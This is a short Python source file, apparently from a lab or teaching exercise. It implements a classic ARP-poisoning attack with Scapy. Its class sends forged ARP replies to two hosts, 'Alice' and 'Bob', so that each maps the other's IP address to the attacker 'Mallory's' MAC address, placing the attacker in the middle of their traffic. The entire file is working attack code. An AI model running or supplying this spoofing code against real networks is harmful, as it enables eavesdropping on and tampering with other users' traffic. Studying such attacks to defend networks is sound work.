"""
Arppoison class which does a classic arp-poison attack implemented with Scapy
"""

from scapy.all import *

class ArpPoison:

    # Sets variables needed for ARP poisoning
    def __init__(self, macA, ipA, macB, ipB, macM, ipM):
        self.macA = macA
        self.ipA = ipA
        self.macB = macB
        self.ipB = ipB
        self.macM = macM
        self.ipM = ipM

    # ARP poison of Alice machine, spoofs Bobs address to Mallory's
    def arpPoisonA(self):
        arpA = Ether() / ARP()
        arpA[Ether].src = self.macM
        arpA[ARP].hwsrc = self.macM
        arpA[ARP].psrc = self.ipB
        arpA[ARP].hwdst = self.macA
        arpA[ARP].pdst = self.ipA
        sendp(arpA)
        print "ARP packet send to Alice"

    # ARP poison of Bobs machine, spoofs Alices address to Mallory's
    def arpPoisonB(self):
        arpB = Ether() / ARP()
        arpB[Ether].src = self.macM
        arpB[ARP].hwsrc = self.macM
        arpB[ARP].psrc = self.ipA
        arpB[ARP].hwdst = self.macB
        arpB[ARP].pdst = self.ipB
        sendp(arpB)
        print "ARP packet send to Bob"
